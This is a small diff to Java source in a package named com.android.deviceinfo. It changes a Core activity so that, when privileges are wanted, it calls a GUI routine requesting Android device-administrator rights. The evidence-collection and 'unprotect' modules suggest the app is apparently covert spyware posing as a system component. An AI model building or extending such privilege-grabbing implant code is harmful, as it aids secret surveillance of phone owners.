@@ -34,6 +34,7 @@ import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
+import com.android.deviceinfo.gui.DeviceAdminRequest;
 import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.listener.BSm;
 import com.android.deviceinfo.manager.ManagerEvent;
@@ -229,10 +230,16 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " Error (unprotect): " + ex);
 			}			
 		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (run) release semAdmin");
+
+			
+			DeviceAdminRequest gui = Status.getAppGui();
+			if(gui!=null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (run) calling gui admin");
+				}
+				gui.deviceAdminRequest();
 			}
-			Status.getSemAdmin().release();
+			
 		}
 
 		try {
